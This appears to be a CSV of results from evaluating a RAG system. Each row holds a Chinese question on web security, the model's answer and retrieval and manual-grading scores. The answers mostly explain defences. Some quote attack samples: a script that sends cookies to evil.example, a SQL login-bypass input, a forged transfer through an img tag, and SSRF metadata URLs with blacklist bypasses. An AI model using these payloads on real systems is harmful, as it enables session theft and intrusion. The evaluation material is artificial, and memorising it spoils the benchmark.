taskId,taskName,mode,itemId,question,answer,retrievalTimeMs,generationTimeMs,totalTimeMs,promptTokens,completionTokens,retrievalHit,precisionAtK,recallAtK,keywordHitRate,citationMatched,manualCorrectness,manualRelevance,manualCompleteness,manualHallucination,error
4,RAG基线-TopK5,RAG_LLM,1,什么是 SQL 注入?如何防御?,"# SQL 注入原理与防御  ## 一、什么是 SQL 注入  SQL 注入(SQL Injection, CWE-89)是一种将恶意 SQL 语句插入应用程序查询参数, 从而欺骗后端数据库执行非预期命令的攻击方式。它长期位居 OWASP Top 10 漏洞列表前列, 可能导致**数据泄露、数据篡改、认证绕过甚至服务器接管** [2]。  ## 二、攻击原理  当应用程序将用户输入**直接拼接**进 SQL 语句时, 攻击者可以构造特殊输入改变语句逻辑。以登录场景为例 [2]:  ```sql -- 拼接式查询(危险) SELECT * FROM users WHERE username = '输入1' AND password = '输入2' ```  若攻击者在用户名处输入 `admin' --`, 拼接后的语句变为 [2][3]:  ```sql SELECT * FROM users WHERE username = 'admin' --' AND password = '...' ```  `--` 之后的内容被注释, **密码校验被完全绕过**。更严重的情况下, 攻击者还可利用 `UNION SELECT` 读取任意表数据, 或利用数据库特性执行系统命令 [3]。  ## 三、常见攻击类型 [3]  1. **基于布尔的盲注**: 通过页面返回差异逐位猜测数据; 2. **基于时间的盲注**: 利用 `SLEEP()` 等函数根据响应时间推断数据; 3. **UNION 注入**: 利用 `UNION SELECT` 合并查询结果直接读取数据; 4. **堆叠查询**: 分号后追加第二条语句(取决于数据库与驱动配置)。  ## 四、防御措施  ### 1. 参数化查询(首选)[3][4]  使用预编译语句, 用户输入只作为数据绑定, **不参与 SQL 语法解析**:  ```java // Java JDBC String sql = ""SELECT * FROM users WHERE username = ? AND password = ?""; PreparedStatement ps = conn.prepareStatement(sql); ps.setString(1, username); ps.setString(2, password); ```  ### 2. 使用 ORM 框架并规范占位符 [4]  - MyBatis 中使用 `#{}` 占位符即参数化绑定; - **严禁使用 `${}` 直接拼接**。  ### 3. 动态字段白名单控制 [1]  对于无法参数化的场景(如动态排序字段), 应使用**白名单映射**, 限制可传入的字段范围。  ### 4. 对""生成 SQL""类输出的额外校验  若系统输出会被用于执行(如大模型生成 SQL/代码), 必须走**独立校验或沙箱**, 不可直接执行 [5]。此条来自大模型应用安全文档, 适用于 AI 生成 SQL 的特殊场景。  ---  **核心结论**: SQL 注入的本质是""用户输入被当作 SQL 语法执行"", 防御的根本思路是**让数据永远是数据**——优先采用参数化查询/预编译语句 [3][4], ORM 层面坚持 `#{}` 而非 `${}` [1][4], 并对动态字段实施白名单控制 [1]。",26708,24157,50866,1127,1125,1,0.6000,1.0000,0.7500,1,5,5,4,0
4,RAG基线-TopK5,RAG_LLM,2,MyBatis 中 #{} 和 ${} 的区别是什么?,"# MyBatis 中 #{} 与 ${} 的区别  ## 一、核心区别  | 对比项 | `#{}` | `${}` | |--------|-------|-------| | 处理方式 | 占位符，即**参数化绑定** [2] | **字符串直接拼接** [2] | | 安全性 | 安全，可有效防止 SQL 注入 [2] | **存在 SQL 注入风险** [2] | | 使用建议 | 推荐全部使用 [1] | 严禁使用（直接拼接场景）[2] |  ## 二、原理说明  - **`#{}`**：MyBatis 会将其作为参数化占位符处理，参数值以安全绑定方式传入，用户输入不会被当作 SQL 语法执行，因此能防御注入 [2]。 - **`${}`**：MyBatis 会将内容**直接以字符串拼接到 SQL 语句中**，攻击者可借此注入恶意 SQL 片段，属于典型的注入风险点 [2]。  ## 三、代码示例（引自知识库）  ```xml <!-- 正确: 参数化 --> <select id=""findUser"">     SELECT * FROM users WHERE id = #{id} </select>  <!-- 危险: 字符串拼接, 存在注入风险 --> <select id=""bad"">     SELECT * FROM users ORDER BY ${column} </select> ``` [2]  ## 四、典型危险场景与替代方案  `ORDER BY ${column}` 这类**动态排序字段**无法直接用参数化绑定实现，这正是 `${}` 最常被误用的场景。知识库给出的方案是：  - **动态排序字段使用白名单映射**：将外部传入的排序字段映射到预定义的、可信的列名，而不是直接拼接用户输入 [1]。  ## 五、配套防御建议  防注入不能只依赖 `#{}`，还应结合以下措施（同属 SQL 注入防护体系）：  1. **输入白名单校验**：对输入按类型、长度、格式、字符集校验，例如 ID 参数只允许数字 [2]。 2. **最小权限原则**：数据库账号仅授予业务所需最小权限，禁止应用账号使用 root 或 sa 权限 [2]。 3. **其他加固**：错误信息脱敏（避免暴露数据库结构与驱动信息）、部署 WAF 作为辅助防线、定期代码审计与漏洞扫描 [2]。  ---  **补充说明（通用知识，无知识库引用）**：`#{}` 底层通常基于 JDBC 的 `PreparedStatement` 预编译机制实现，SQL 结构与参数分离；而 `${}` 是在 SQL 生成阶段直接文本替换，因此丧失了预编译的防护能力。这一底层实现细节超出当前知识库范围，仅供参考。",517,27276,27793,959,1097,1,0.2000,1.0000,1.0000,1,0,0,0,0
4,RAG基线-TopK5,RAG_LLM,3,XSS 有哪几种类型?分别如何防御?,"# XSS 的类型与防御  ## 一、XSS 的三种类型  根据知识库 [1]，跨站脚本攻击（Cross-Site Scripting, CWE-79）是指攻击者向 Web 页面注入恶意脚本，当其他用户浏览该页面时，脚本在受害者浏览器中执行，从而窃取会话 Cookie、篡改页面、发起钓鱼或键盘记录等攻击 [1]。具体分为三种类型：  | 类型 | 触发方式 | 特点 | |------|----------|------| | **反射型 XSS** | 恶意脚本来自用户请求参数，服务器将其“反射”回响应页面 | 常见于搜索结果页 [1] | | **存储型 XSS** | 恶意脚本被持久化存储到数据库（如评论、个人简介） | 所有访问者都会执行，**危害最大** [1] | | **DOM 型 XSS** | 由前端 JavaScript 不当操作 DOM 引起（如 `innerHTML` 写入未净化的 URL 参数） | 数据不经过服务器 [1] |  知识库中还给出了一个典型攻击示例：评论功能未过滤输出时，攻击者可提交如下代码窃取其他访问者的 Cookie [1]：  ```html <script>fetch('https://evil.example/steal?c=' + document.cookie)</script> ```  ## 二、如何防御 XSS  ### 知识库中可直接引用的要点  - **输出渲染前处理**：模型或动态内容输出在渲染前端前，必须经 XSS 处理，不可直接渲染 [3]。 - **XSS 修复是其他防御的前置条件**：XSS 通常可以用来绕过 CSRF Token 防御（脚本可读取 Token），因此修复 XSS 是 CSRF 防御的前置条件 [2]。  ### 补充的通用防御知识（当前知识库片段中未包含完整 XSS 防护细节，以下为通用安全常识，无知识库引用）  需要说明：当前知识库片段主要覆盖 XSS 的类型定义与攻击示例，未找到系统性的 XSS 防护清单（引用 [1] 的防护章节未包含在片段中）。以下为业界通用的防御方案，仅供参考：  **1. 输出编码（最核心）** - 根据输出上下文选择编码方式：HTML 实体编码、JavaScript 编码、URL 编码、CSS 编码 - 使用成熟模板引擎的自动转义功能（如 Jinja2、Thymeleaf）  **2. 输入校验** - 对用户输入做白名单校验（长度、格式、字符集），但输入校验不能替代输出编码  **3. 安全的 DOM 操作（针对 DOM 型 XSS）** - 优先使用 `textContent` / `innerText`，避免将不可信数据写入 `innerHTML` - 避免 `eval()`、`document.write()` 等危险 API  **4. Cookie 保护（降低危害）** - 会话 Cookie 设置 `HttpOnly`（禁止 JS 读取）、`Secure`（仅 HTTPS 传输） - 配合 `SameSite` 属性限制 Cookie 跨站发送 [2]  **5. CSP 内容安全策略** - 通过 `Content-Security-Policy` 响应头限制脚本来源，即使注入成功也难以执行  **6. 高危操作加固** - 对转账、改密等敏感操作增加二次认证 [2]，即使 XSS 窃取了会话也难以直接造成损失  ---  **小结**：XSS 分为反射型、存储型、DOM 型三类 [1]，其中存储型危害最大；防御核心是“不信任任何输出”——在数据进入 HTML/JS/URL 等执行上下文前进行对应编码，并辅以 HttpOnly、CSP 等纵深防御手段（通用知识补充）。",351,34218,34569,1516,1387,1,0.2000,1.0000,1.0000,1,0,0,0,0
4,RAG基线-TopK5,RAG_LLM,4,CSRF 攻击的原理是什么?有哪些防御手段?,"# CSRF 攻击原理与防御手段  ## 一、什么是 CSRF  跨站请求伪造(Cross-Site Request Forgery, CWE-352)是指攻击者诱导**已登录用户**的浏览器, 在用户不知情的情况下向目标站点发送恶意请求。由于请求携带了用户的合法会话凭证(如 Cookie), 服务器难以区分这是否为用户本人意愿, 从而以用户身份执行了操作 [1]。  ## 二、攻击原理  **典型场景**: 用户已登录 `bank.example`, 会话 Cookie 仍然有效。攻击者在第三方页面埋入恶意代码 [1]:  ```html <img src=""https://bank.example/transfer?to=attacker&amount=10000""> ```  用户访问该页面时, 浏览器自动携带 Cookie 发起转账请求, 攻击完成 [1]。  **攻击成立的三个关键条件** [1]:  1. 受害者在目标站点持有有效会话 2. 目标操作仅需 Cookie 即可认证, 无二次确认 3. 攻击者能诱导受害者访问恶意页面  ## 三、防御手段  ### 1. CSRF Token(主流方案)  服务器为每个会话生成随机 Token, 嵌入表单或请求头; 请求到达时校验 Token 是否匹配。攻击者无法跨站读取该 Token, 伪造请求即告失败 [2]。  ```html <form method=""post"" action=""/transfer"">  <input type=""hidden"" name=""_csrf"" value=""随机Token"">  ... </form> ```  以 Spring Security 为例, 默认启用 CsrfFilter, 对非幂等请求(POST/PUT/DELETE)校验 `_csrf` 参数或 `X-CSRF-TOKEN` 头 [2]。  ### 2. SameSite Cookie  现代浏览器支持 SameSite 属性, 限制 Cookie 在跨站请求中发送 [2]:  ``` Set-Cookie: SESSIONID=xxx; SameSite=Lax; Secure; HttpOnly ```  - `Strict`: 完全不跨站发送 - `Lax`: 导航级 GET 请求允许携带(浏览器默认)[2][4]  ### 3. 校验 Origin 与 Referer  对敏感请求检查 `Origin`/`Referer` 头是否为本站域名, 拒绝来源不明的跨站请求 [4]。  ### 4. 避免 GET 产生副作用  严格遵守 HTTP 语义: 查询用 GET, 修改用 POST/PUT/DELETE, 从根源上杜绝 img/script 标签型 CSRF [4]。  ### 5. 二次认证  对转账、改密、删除等高危操作要求再次输入密码、验证码或动态口令 [4]。  ## 四、补充: CSRF 与 XSS 的关系  理解两者的区别有助于设计更完整的防御体系 [4]:  - **CSRF** 利用服务器对浏览器的信任, 攻击的是""用户身份""; **XSS** 利用站点对输出的信任, 攻击的是""浏览器执行环境""。 - XSS 通常可以用来**绕过 CSRF Token 防御**(恶意脚本可读取页面中的 Token), 因此**修复 XSS 是 CSRF 防御的前置条件** [4]。  ## 总结  | 防御层次 | 措施 | 特点 | |---------|------|------| | 请求校验 | CSRF Token | 主流方案, 通用性强 [2] | | 浏览器侧 | SameSite Cookie | 依赖浏览器支持 [2] | | 来源校验 | Origin/Referer 检查 | 辅助手段 [4] | | 协议规范 | GET 无副作用 | 从根源杜绝标签型攻击 [4] | | 业务加固 | 高危操作二次认证 | 纵深防御 [4] |  实际项目中建议**组合使用**多种措施形成纵深防御, 并优先修复 XSS 漏洞, 避免 Token 防御被绕过 [4]。",374,17949,18324,1341,1034,1,0.6000,1.0000,1.0000,1,0,0,0,0
4,RAG基线-TopK5,RAG_LLM,5,SSRF 是什么?云环境中最典型的危害是什么?,"# SSRF 定义与云环境典型危害  ## 一、SSRF 是什么  **SSRF(Server-Side Request Forgery,服务端请求伪造,CWE-918)** 是指攻击者诱使服务器端应用向攻击者指定的地址发起请求。由于请求是由内网服务器发出的, 攻击者可借此:  - 探测内网(通过返回差异或超时时间推断内网主机与端口存活情况) - 访问内网服务 - 读取云平台元数据 - 借助内网管理接口控制服务器 [1]  SSRF 在 **OWASP Top 10 2021** 中被列为 **A10:2021** [2][4], 在 **OWASP API 安全 Top 10** 中对应 **API7** [3]。  ## 二、云环境中最典型的危害  **云元数据泄露** 是云环境下最典型的危害 [1]:  - 云环境中的元数据服务地址为 `http://169.254.169.254/latest/meta-data/` - 攻击者通过 SSRF 请求该地址, 可**获取实例凭证** - 拿到凭证后可**进一步接管云资源**, 危害从""读取信息""升级为""控制云基础设施"" [1]  ## 三、其他常见危害场景(补充)  除云元数据泄露外, SSRF 还包括 [1]:  1. **内网探测**: 例如请求 `http://192.168.1.1:8080/` 判断内网存活 2. **协议滥用**: 利用 `file://` 读取本地文件, 利用 `gopher://`、`dict://` 等协议构造任意报文 3. **绕过技巧**: 使用十进制 IP(`2130706433` 代替 `127.0.0.1`)、短链接、DNS 重绑定、`0.0.0.0`、`[::1]` 等绕过基于字符串的黑名单校验 [1]  ## 四、防御要点(简要)  根据知识库中 API7 的防御建议 [3]:  - **白名单目标**: 限定允许请求的目标地址 - **禁用危险协议**: 禁止 `file://`、`gopher://` 等协议 - **解析后校验 IP**: 在 DNS 解析完成后再校验目标 IP, 防 DNS 重绑定绕过 - **网络隔离**: 将发起出站请求的服务与内网核心资源隔离  > 说明: 以上内容均来自知识库片段 [1] 与 [3], 未补充知识库之外的通用知识。",686,27404,28091,1478,1097,1,0.2000,1.0000,0.8000,1,0,0,0,0
4,RAG基线-TopK5,RAG_LLM,6,JWT 常见的安全风险有哪些?,"# JWT 常见安全风险  根据知识库内容，JWT 主要存在以下五类安全风险：  ## 1. 算法混淆攻击  服务端如果信任 Token Header 中声明的签名算法，攻击者可以进行篡改伪造：  - 将 `alg` 字段改为 `none`,绕过签名验证 - 将 RS256 篡改为 HS256,利用公钥充当 HMAC 密钥来伪造合法签名  **防御措施**：服务端应硬编码固定算法，不从 Token 中读取算法声明 [1]。  ## 2. 密钥强度不足与硬编码  - 使用弱密钥(如 `secret`、`123456`)容易被暴力破解 - 密钥硬编码在源码中，一旦泄露即全面失守  **防御措施**：密钥仅通过环境变量或密钥管理服务(KMS)注入，长度不低于 256 位 [4]。  ## 3. 敏感信息泄露  JWT 的 Payload 仅做 Base64 编码，内容是**明文可读**的，严禁在其中存放密码、手机号等敏感数据 [4]。  ## 4. Token 无法主动失效  JWT 是无状态的，签发后在过期前始终有效。当用户改密、注销或账号被盗时，缺乏失效机制会带来风险。  **防御措施**： - 引入服务端黑名单(如 Redis) - 缩短有效期，配合刷新令牌(Refresh Token)机制 - 在签名中加入版本号，随密钥变更使旧 Token 失效 [4]  ## 5. 存储位置风险  | 存储位置 | 风险 | 配套防御 | |---------|------|---------| | localStorage | 易受 XSS 攻击窃取 | 需配套严格的 XSS 防御 | | HttpOnly Cookie | 天然防 XSS 窃取 | 需配套 CSRF 防御 |  来源:[4]  ## 小结  JWT 的安全风险核心在于：**签名验证被绕过**(算法混淆)、**密钥管理不当**(弱密钥/硬编码)、**编码≠加密**(敏感信息泄露)、**无状态特性**(无法主动失效)以及**客户端存储位置选择**。其中硬编码密钥问题也与 OWASP Top 10 中 A02:2021 加密失败风险相符 [5],建议在架构设计阶段统一纳入密钥管理规范。",1032,18491,19524,1591,795,1,0.4000,1.0000,0.6000,1,0,0,0,0
4,RAG基线-TopK5,RAG_LLM,7,文件上传功能有哪些安全风险?如何防范?,"# 文件上传功能的安全风险与防范  ## 一、文件上传的主要安全风险  根据知识库，文件上传功能是 Web 攻击的高发入口，主要风险包括以下五类 [1]:  | 风险类型 | 说明 | |---------|------| | **WebShell 上传** | 上传可执行脚本(如 `shell.jsp`、`shell.php`),直接获得服务器控制权 [1] | | **目录穿越** | 利用 `../../` 将文件写到任意路径,覆盖关键配置 [1] | | **存储型 XSS** | 上传含脚本的 HTML/SVG 文件并被浏览器直接渲染 [1] | | **拒绝服务(DoS)** | 上传超大文件或畸形压缩包耗尽磁盘与内存 [1] | | **恶意文件分发** | 服务器被当作恶意文件中转站 [1] |  ## 二、防御措施  ### 1. 知识库中的防御方案  **(1)严格校验文件类型(白名单)** [1]  - **扩展名白名单**：仅允许业务必需的类型(如 pdf、txt、md、docx),拒绝一切可执行扩展名 [1] - **文件头(Magic Number)校验**：防止攻击者仅修改扩展名绕过检测；但需注意文件头本身也可能被伪造，因此 **白名单 + 头校验必须配合使用** [1] - **内容解析校验**：使用成熟解析库读取文件内容，拒绝解析失败或内容异常的文件 [1]  **(2)重命名存储** [1]  知识库片段中列出了该防御要点，但具体细节内容不完整，核心思想是不要使用用户上传时的原始文件名存储(该部分细节属于通用补充，见下文)。  ### 2. 通用安全常识补充  > ⚠️ **说明**：当前知识库中未找到充分依据覆盖以下内容(知识库片段 [1] 在“重命名存储”处截断)，以下为通用安全实践，无知识库引用，供参考。  - **随机化文件名**：存储时使用随机 UUID/哈希重命名，防止路径猜测，并消除原始文件名中可能携带的恶意字符(如 `../../`、空字节等)，与目录穿越风险对应 - **上传目录禁止执行**：将上传目录的脚本执行权限关闭(如 Nginx/Apache 配置层面禁止解析 PHP/JSP) - **存储位置隔离**：上传文件尽量存储在 Web 根目录之外，或使用对象存储(OSS/S3)配合独立域名访问 - **限制文件大小与数量**：服务端设置单文件大小上限、请求频率限制，防范拒绝服务风险；对压缩包解压设置大小/条目限制，防范压缩炸弹 - **图片二次处理**：对图片类文件进行二次渲染或转码，可剥离其中嵌入的恶意代码 - **内容安全检测**：接入病毒扫描(如 ClamAV)对上传文件进行检测，防范恶意文件分发 - **审计与监控**：记录上传日志(IP、文件名、大小、时间)，对异常上传行为告警  ## 三、总结  文件上传是攻击者获取服务器权限的重要入口，防御核心思路是 **“不信任用户输入的任何内容""** [1]:  1. **白名单优先**：扩展名 + 文件头 + 内容解析三层校验缺一不可 [1] 2. **控制存储行为**：重命名存储，避免使用原始文件名 [1],并配合目录隔离、禁止执行等通用措施 3. **限制资源消耗**：限制大小与频率，防范拒绝服务 [1]  如需了解某类风险(如 WebShell 检测、目录穿越细节)的更多内容，欢迎继续提问。",381,36996,37377,1294,1522,1,0.2000,1.0000,0.5000,1,0,0,0,0
4,RAG基线-TopK5,RAG_LLM,8,BOLA 和 BFLA 的区别是什么?,"# BOLA 与 BFLA 的区别  ## 一句话概括  | 对比项 | BOLA | BFLA | |---|---|---| | 全称含义 | 对象级授权失效 | 功能级授权失效 | | 问题核心 | “这个**数据对象**是不是你的”没校验 | “这个**功能接口**能不能调用”没校验 | | 典型越权方向 | 横向越权(同级用户之间) | 垂直越权为主(普通用户触碰管理功能) |  ---  ## 1. BOLA:对象级授权失效  BOLA 的漏洞本质是: **API 只验证了""你是谁""(认证), 但没有验证""这个对象是不是你的""(授权)**, 从而导致横向越权 [1]。  典型表现如下 [1]:  ``` GET /api/invoices/5001 # A 用户查看自己的发票 → 200 GET /api/invoices/5002 # A 用户查看 B 用户的发票 → 若无归属校验, 同样 200 ```  BOLA 位列 OWASP API Security Top 10 之首, 是数据泄露事件的最主要根因 [1]。  **高发场景** [1]: 1. 自增整数主键暴露, 易于遍历(5001 → 5002 → ...) 2. UUID 被误认为""不可猜测即安全""(一旦泄露仍可越权) 3. 批量接口、导出接口、子资源路径(`/users/{id}/orders`)遗漏校验 4. 导航/回退接口复用了宽权限查询  **防御思路**: 每次数据访问都把""归属""写进查询条件, 即在查询层面强制限定资源属主 [1]。  ---  ## 2. BFLA:功能级授权失效  知识库中关于 BFLA 的直接阐述较为有限。可依据的是: 功能级授权失效关注**管理功能接口暴露问题**, 在 OWASP API Security 2023 版中该问题被拆分并入 BFLA 与 BOLA 相关条目 [2]。  > ⚠️ **说明**: 知识库片段 [1] 虽然标题涵盖""BOLA 与 BFLA"", 但可见内容仅详细展开了 BOLA 部分, 当前知识库中未找到关于 BFLA 的充分详细依据。以下补充内容为**通用安全常识, 无知识库引用**:  - **通用知识补充**: BFLA 通常指用户能够调用其角色本无权使用的功能接口, 例如普通用户直接请求 `/api/admin/deleteUser` 等管理端接口成功执行。它攻击的是""**某个功能/API 端点本身的访问权限**"", 而 BOLA 攻击的是""**对某个具体数据对象的归属权限**""。 - 防御上两者同源: 除了认证之外, 还必须在**服务端**进行功能级(角色/权限)与对象级(资源属主)双重授权校验, 不能依赖前端隐藏入口。  ---  ## 3. 关键区别总结  1. **校验对象不同**: BOLA 校验的是""数据对象归属权""(这条发票是不是你的); BFLA 校验的是""功能调用权限""(你能不能执行删除用户这个操作)。 2. **越权方向不同**: BOLA 以横向越权为主——同级用户之间互相访问数据 [1]; BFLA 以垂直越权为主——低权限用户调用高权限功能(如管理接口)[2]。 3. **典型入口不同**: BOLA 常见于带资源 ID 的查询/导出接口 [1]; BFLA 常见于管理功能接口暴露问题 [2]。 4. **共同点**: 二者都属于""认证了但授权缺失/失效"", 且在 2023 版 OWASP API Security Top 10 中被作为相关条目对待 [2]。  ---  ## 4. 落地防御建议  在代码评审阶段应将两者同时纳入检查项, 例如确认""新接口是否做了认证与授权(BOLA/BFLA)"" [3]。具体而言:  - 对象级(BOLA): 查询条件中强制加入资源属主过滤, 不信任客户端传入的 ID 本身 [1]; - 功能级(BFLA, 通用知识补充): 建立服务端统一的权限模型(角色/权限点), 对每个接口声明并强制校验所需权限, 对管理接口做单独的访问控制与审计。",382,42562,42945,1364,1749,1,0.2000,1.0000,1.0000,1,0,0,0,0
4,RAG基线-TopK5,RAG_LLM,9,为什么不能使用 MD5 存储密码?应该用什么?,"# 为什么不能使用 MD5 存储密码？  ## 一、MD5 存储密码的问题  ### 1. 本质是“快速哈希”，安全性极差  MD5/SHA1 属于危险方案，其核心缺陷在于**哈希计算速度极快**，导致彩虹表攻击与暴力破解都极易实现 [2]。攻击者拿到哈希值后，可以高速穷举候选密码，快速还原明文。  ### 2. 即使“加盐 MD5”也不够安全  加盐只能部分缓解问题，但依然不足：  - 盐值通常与哈希一同存储，**数据库被拖库时盐会被一并获取**，失去隔离意义 [2] - MD5 计算太快，现代硬件上 **GPU 每秒可计算数十亿次**，攻击者加盐后照常暴力破解 [2]  ### 3. 官方加固指南明确禁止  Spring Boot 安全加固指南也明确要求：使用 BCrypt(自适应加盐慢哈希)存储密码，**禁止 MD5/SHA1 等明文级方案** [4]。  ## 二、应该用什么？  ### 推荐方案：PBKDF2 / BCrypt / Argon2  这类算法的核心优势是 **自适应慢哈希 + 盐**，且成本参数可随硬件升级而调整，始终保持足够的破解成本 [2]。  ### BCrypt 的三大特性 [2]  1. **自带随机盐**：相同密码每次哈希结果都不同，天然抗彩虹表 2. **成本因子可调**：哈希轮数为 2^cost,可随硬件进步调大，持续维持破解成本 3. **输出自包含**：形如 `$2a$10$N9qo8uLOickgx2ZMRZoMye...` 的结果中内含算法版本、成本因子、盐与哈希值，校验时直接从串中解析，无需单独存盐  > 建议成本因子设为 **10-12**(单次哈希约 60-250ms)—— 对用户登录无感知，对攻击者却是巨大的算力开销 [2]。  ## 三、代码示例(Spring Boot)  Spring Boot 中推荐使用 `BCryptPasswordEncoder`(默认强度 10)[4]:  ```java @Bean public PasswordEncoder passwordEncoder() {     return new BCryptPasswordEncoder(); // 默认强度 10 }  // 注册: 存储哈希值 String hash = passwordEncoder.encode(rawPassword);  // 登录校验: 直接用 matches 对比 boolean ok = passwordEncoder.matches(rawPassword, storedHash); ```  ## 四、方案对比总结 [2]  | 方案 | 安全性 | 说明 | |------|--------|------| | 明文 | 危险 | 任何泄露即直接暴露 | | MD5/SHA1 | 危险 | 快速哈希，彩虹表与暴力破解极易 | | 加盐 MD5 | 不足 | 盐可被一同拖库，GPU 每秒可算数十亿次 | | **PBKDF2/BCrypt/Argon2** | **推荐** | 自适应慢哈希+盐，成本参数可随硬件升级 |  **核心结论**：密码存储的关键不在于“哈希过”，而在于“破解足够慢”。MD5 设计目标是快速校验数据完整性，而非抵抗暴力破解；应选用 BCrypt 等专门的密码哈希算法，并通过成本因子随硬件演进持续提升安全强度 [2][4]。",271,23248,23519,1525,1177,1,0.2000,1.0000,1.0000,1,0,0,0,0
4,RAG基线-TopK5,RAG_LLM,10,RAG 系统的完整流程是什么?,"# RAG 系统的完整流程  ## 一、总体架构  RAG(Retrieval-Augmented Generation, 检索增强生成)采用""**先检索、后生成**""的两阶段架构：用户提问后，系统先从外部知识库检索相关内容，再将其作为上下文交给 LLM 生成回答。该架构可缓解 LLM 的三大缺陷：知识截止、幻觉、私域知识缺失 [1]。  ## 二、离线索引阶段  知识库中完整记载了该阶段的五个步骤 [1]:  1. **文档解析**：提取 PDF/TXT/MD/DOCX 的文本内容 2. **清洗**：去除控制字符、页眉页脚、乱码等噪声 3. **分块**：按语义边界与固定长度切分为 chunk,通常 256-1024 字符，相邻块保留重叠以保持语义连贯 4. **向量化**：使用 Embedding 模型将每个 chunk 映射为稠密向量 5. **入库**：向量与原文、元数据(文档名、页码、块序号)一同存入向量数据库  ## 三、在线问答阶段  **说明**：当前知识库片段中，该阶段仅有标题“在线问答阶段”，未提供完整步骤内容[1]。仅从另一片段可推断其关键机制：用户提问后，系统检索命中的 chunk 会被拼入模型上下文 [3]。因此以下为**通用安全常识补充(无知识库引用)**，供参考：  1. **用户提问**：接收用户问题 2. **查询向量化**：将问题用同一 Embedding 模型映射为向量 3. **相似度检索**：在向量数据库中检索语义最相近的 Top-K chunk 4. **上下文组装**：将检索到的 chunk 与用户问题按模板拼装成提示词 5. **LLM 生成回答**：模型基于拼装后的上下文生成最终回答  > 安全提示：在线阶段将检索内容拼入上下文，正是间接提示注入(恶意指令藏于知识库文档、随检索命中被触发)的攻击入口，应对检索内容做隔离包裹与来源审核 [2][3]。  ---  **引用来源小结**：离线五步骤及总体架构引自 [1];在线阶段检索命中后拼入上下文的机制引自 [3];在线阶段详细步骤为通用知识补充，无知识库引用。",278,19593,19872,1410,882,1,0.2000,1.0000,0.8000,1,0,0,0,0
